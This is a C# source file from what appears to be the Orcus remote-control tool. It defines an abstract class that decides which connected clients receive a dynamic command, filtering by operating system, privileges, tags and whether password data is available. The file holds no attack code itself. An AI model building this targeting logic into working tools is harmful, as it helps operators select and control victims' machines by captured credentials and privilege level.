using System;
using System.Xml.Serialization;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands.Conditions;

namespace Orcus.Shared.DynamicCommands
{
    /// <summary>
    ///     A condition to filter the <see cref="CommandTarget"/> of a <see cref="DynamicCommand" />
    /// </summary>
    [Serializable]
    [XmlInclude(typeof (OperatingSystemCondition))]
    [XmlInclude(typeof (VersionCondition))]
    [XmlInclude(typeof (PasswordDataAvailableCondition))]
    [XmlInclude(typeof (PrivilegesCondition))]
    [XmlInclude(typeof (ClientBinaryFrameworkCondition))]
    [XmlInclude(typeof (ClientTagCondition))]
    public abstract class Condition
    {
        /// <summary>
        ///     Types of all implementations of this class which are needed for serialization
        /// </summary>
        public static readonly Type[] AbstractTypes =
        {
            typeof (OperatingSystemCondition), typeof (VersionCondition),
            typeof (PasswordDataAvailableCondition), typeof (PrivilegesCondition),
            typeof (ClientBinaryFrameworkCondition), typeof (ClientTagCondition)
        };

        /// <summary>
        ///     The display string of this condition
        /// </summary>
        public abstract string DisplayString { get; }

        /// <summary>
        ///     The name of this condition
        /// </summary>
        public abstract string ConditionType { get; }

        /// <summary>
        ///     Execute this condition
        /// </summary>
        /// <param name="onlineClientInformation">The client</param>
        /// <param name="clientConfig">The configuration of the <see cref="onlineClientInformation" /></param>
        /// <returns>Return true if the command should be executed on the given client</returns>
        public abstract bool IsTrue(ClientInformation onlineClientInformation, ClientConfig clientConfig);
    }
}